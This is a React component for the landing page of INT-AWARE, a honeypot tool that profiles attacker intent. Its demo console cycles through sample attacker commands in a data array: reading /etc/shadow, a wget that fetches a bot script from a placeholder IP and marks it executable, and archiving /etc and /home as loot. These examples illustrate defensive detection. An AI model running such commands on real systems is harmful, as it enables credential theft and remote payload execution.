import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import {
  Shield,
  ArrowRight,
  Terminal,
  Activity,
  Zap,
  CheckCircle2,
  Lock,
  Radio,
  AlertTriangle,
} from 'lucide-react';
import { GithubIcon } from '../common/GithubIcon';

const SIMULATED_ATTACKS = [
  {
    cmd: 'uname -a',
    intent: 'RECONNAISSANCE',
    stage: 'RECONNAISSANCE',
    mitre: 'T1082 (System Info Discovery)',
    confidence: '95.4%',
    source: 'ML',
    risk: 15,
  },
  {
    cmd: 'cat /etc/shadow',
    intent: 'CREDENTIAL_ACCESS',
    stage: 'CREDENTIAL_ACCESS',
    mitre: 'T1003 (OS Credential Dumping)',
    confidence: '98.8%',
    source: 'RULE+ML',
    risk: 45,
  },
  {
    cmd: 'wget http://192.0.2.10/bot.sh; chmod +x bot.sh',
    intent: 'EXECUTION',
    stage: 'EXECUTION',
    mitre: 'T1059 (Command & Script Interpreter)',
    confidence: '100.0%',
    source: 'ML',
    risk: 65,
  },
  {
    cmd: 'tar czf /tmp/loot.tar.gz /etc /home',
    intent: 'EXFILTRATION',
    stage: 'EXFILTRATION',
    mitre: 'T1560 (Archive Collected Data)',
    confidence: '100.0%',
    source: 'ML',
    risk: 85,
  },
];

export const Hero: React.FC = () => {
  const [activeStep, setActiveStep] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setActiveStep((prev) => (prev + 1) % SIMULATED_ATTACKS.length);
    }, 3200);
    return () => clearInterval(timer);
  }, []);

  const currentAttack = SIMULATED_ATTACKS[activeStep];

  return (
    <section className="relative pt-24 pb-20 overflow-hidden bg-radial-gradient">
      {/* Background cyber grid */}
      <div className="absolute inset-0 bg-grid-pattern opacity-40 pointer-events-none" />

      <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
          {/* Left Column: Heading and Value Proposition */}
          <div className="lg:col-span-7 space-y-6 text-center lg:text-left">
            {/* Status Pill */}
            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyan-950/60 border border-cyan-800/60 text-xs font-mono text-cyan-300 shadow-inner">
              <span className="w-2 h-2 rounded-full bg-cyan-400 animate-ping" />
              <span>Research-Grade Platform · Calibrated 94.49% Real Test Accuracy</span>
            </div>

            {/* Main Headline */}
            <h1 className="text-4xl sm:text-5xl lg:text-6xl font-extrabold tracking-tight text-white leading-[1.12]">
              Real-Time Attacker Profiling Through{' '}
              <span className="bg-gradient-to-r from-cyan-400 via-sky-300 to-indigo-400 bg-clip-text text-transparent">
                Intent-Aware Deception
              </span>
            </h1>

            {/* Description */}
            <p className="text-base sm:text-lg text-slate-300 leading-relaxed max-w-2xl mx-auto lg:mx-0">
              Transform passive honeypot captures into active threat intelligence. INT-AWARE ingests live shell interactions from isolated Cowrie honeypots, classifies attacker intent with a leakage-resistant ML pipeline, models kill-chain sequence transitions, and scores risk dynamically with <strong>zero host execution</strong>.
            </p>

            {/* CTAs */}
            <div className="pt-2 flex flex-col sm:flex-row items-center justify-center lg:justify-start gap-3.5">
              <Link
                to="/docs/quickstart"
                className="w-full sm:w-auto px-6 py-3.5 rounded-xl bg-gradient-to-r from-cyan-500 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-white font-semibold text-sm shadow-xl shadow-cyan-950/60 flex items-center justify-center gap-2 group transition-all cursor-pointer"
              >
                <Zap className="w-4 h-4 text-cyan-200 fill-cyan-200" />
                <span>60-Second Quickstart</span>
                <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
              </Link>

              <Link
                to="/docs/installation/windows"
                className="w-full sm:w-auto px-6 py-3.5 rounded-xl border border-slate-700 hover:border-cyan-600/70 bg-[#0c1324] hover:bg-[#111a33] text-slate-200 font-medium text-sm flex items-center justify-center gap-2 transition-all cursor-pointer"
              >
                <Terminal className="w-4 h-4 text-cyan-400" />
                <span>Installation Guides</span>
              </Link>

              <a
                href="https://github.com/Rakshita-Shetty7/INT-AWARE"
                target="_blank"
                rel="noopener noreferrer"
                className="w-full sm:w-auto px-5 py-3.5 rounded-xl border border-slate-800 hover:border-slate-700 bg-slate-900/40 text-slate-400 hover:text-white text-sm flex items-center justify-center gap-2 transition-colors"
              >
                <GithubIcon className="w-4 h-4" />
                <span>GitHub Source</span>
              </a>
            </div>

            {/* Key Value Badges */}
            <div className="pt-4 grid grid-cols-2 sm:grid-cols-3 gap-3 text-left">
              <div className="p-2.5 rounded-lg bg-[#0a1020] border border-slate-800/80">
                <div className="text-[11px] font-mono text-cyan-400 font-bold">10 INTENT CLASSES</div>
                <div className="text-xs text-slate-400">Recon to Exfiltration</div>
              </div>
              <div className="p-2.5 rounded-lg bg-[#0a1020] border border-slate-800/80">
                <div className="text-[11px] font-mono text-emerald-400 font-bold">ZERO HOST EXECUTION</div>
                <div className="text-xs text-slate-400">100% Isolated Cowrie Sandbox</div>
              </div>
              <div className="p-2.5 rounded-lg bg-[#0a1020] border border-slate-800/80 col-span-2 sm:col-span-1">
                <div className="text-[11px] font-mono text-purple-400 font-bold">MARKOV SEQUENCES</div>
                <div className="text-xs text-slate-400">State Transition Prediction</div>
              </div>
            </div>
          </div>

          {/* Right Column: Live Telemetry Simulation Console */}
          <div className="lg:col-span-5">
            <div className="relative rounded-2xl p-1 bg-gradient-to-b from-cyan-500/30 via-slate-800 to-indigo-500/20 shadow-2xl glow-cyan">
              <div className="rounded-[15px] bg-[#070b16] border border-slate-800/80 p-5 space-y-4">
                {/* Console header */}
                <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                  <div className="flex items-center gap-2">
                    <span className="w-3 h-3 rounded-full bg-rose-500/80" />
                    <span className="w-3 h-3 rounded-full bg-amber-500/80" />
                    <span className="w-3 h-3 rounded-full bg-emerald-500/80" />
                    <span className="text-xs font-mono text-slate-400 ml-2 font-medium">
                      telemetry-pipeline.live
                    </span>
                  </div>
                  <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-950/80 text-emerald-400 border border-emerald-800/50 flex items-center gap-1">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                    STREAMING
                  </span>
                </div>

                {/* Simulated Attacker Command Input */}
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-xs text-slate-400 font-mono">
                    <span className="flex items-center gap-1.5">
                      <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                      Attacker SSH Terminal Input:
                    </span>
                    <span className="text-slate-500 text-[11px]">SSH: 127.0.0.1:2222</span>
                  </div>
                  <div className="p-3 rounded-lg bg-[#04060c] border border-slate-800 font-mono text-xs text-emerald-300">
                    <span className="text-cyan-400">root@cowrie:~#</span>{' '}
                    <span className="font-semibold">{currentAttack.cmd}</span>
                  </div>
                </div>

                {/* Pipeline Real-Time Inference Card */}
                <div className="p-4 rounded-xl bg-[#0c1427] border border-cyan-800/40 space-y-3">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Activity className="w-4 h-4 text-cyan-400" />
                      <span className="text-xs font-mono font-bold text-slate-200">
                        Inferred Intent:
                      </span>
                    </div>
                    <span className="px-2 py-0.5 text-xs font-mono font-bold rounded bg-cyan-950 text-cyan-300 border border-cyan-700/60">
                      {currentAttack.intent}
                    </span>
                  </div>

                  <div className="grid grid-cols-2 gap-2 text-xs font-mono">
                    <div className="bg-[#070b16] p-2 rounded border border-slate-800">
                      <span className="text-slate-500 block text-[10px]">MITRE Technique</span>
                      <span className="text-slate-200 truncate block">{currentAttack.mitre}</span>
                    </div>
                    <div className="bg-[#070b16] p-2 rounded border border-slate-800">
                      <span className="text-slate-500 block text-[10px]">Confidence & Source</span>
                      <span className="text-emerald-400 font-semibold">{currentAttack.confidence} ({currentAttack.source})</span>
                    </div>
                  </div>

                  {/* Cumulative Risk Meter */}
                  <div className="space-y-1 pt-1">
                    <div className="flex items-center justify-between text-[11px] font-mono">
                      <span className="text-slate-400">Cumulative Session Risk:</span>
                      <span className={`font-bold ${currentAttack.risk >= 75 ? 'text-rose-400' : 'text-amber-400'}`}>
                        {currentAttack.risk} / 100 {currentAttack.risk >= 75 ? '(CRITICAL ALERT)' : ''}
                      </span>
                    </div>
                    <div className="w-full h-2 rounded-full bg-slate-800 overflow-hidden">
                      <div
                        className={`h-full transition-all duration-500 ${
                          currentAttack.risk >= 75
                            ? 'bg-gradient-to-r from-amber-500 to-rose-500'
                            : 'bg-gradient-to-r from-cyan-500 to-amber-500'
                        }`}
                        style={{ width: `${currentAttack.risk}%` }}
                      />
                    </div>
                  </div>
                </div>

                {/* Progress Indicators */}
                <div className="flex items-center justify-center gap-1.5 pt-1">
                  {SIMULATED_ATTACKS.map((_, i) => (
                    <button
                      key={i}
                      onClick={() => setActiveStep(i)}
                      className={`h-1.5 rounded-full transition-all cursor-pointer ${
                        activeStep === i ? 'w-6 bg-cyan-400' : 'w-2 bg-slate-700 hover:bg-slate-500'
                      }`}
                      aria-label={`Show attack step ${i + 1}`}
                    />
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};
